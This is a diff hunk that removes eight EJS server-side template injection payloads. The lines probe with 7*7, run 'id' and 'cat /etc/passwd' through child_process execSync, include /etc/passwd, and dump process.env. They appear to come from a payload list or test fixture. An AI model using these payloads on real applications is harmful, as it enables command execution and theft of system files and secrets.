@@ -1,8 +1,0 @@
-<%= 7*7 %>
-<%= process.mainModule.require('child_process').execSync('id').toString() %>
-<%= include('/etc/passwd') %>
-<%= global.process.mainModule.require('child_process').execSync('id') %>
-<%- include('/etc/passwd') %>
-<%= process.env %>
-<%= JSON.stringify(process.env) %>
-<%- process.mainModule.require('child_process').execSync('cat /etc/passwd') %>
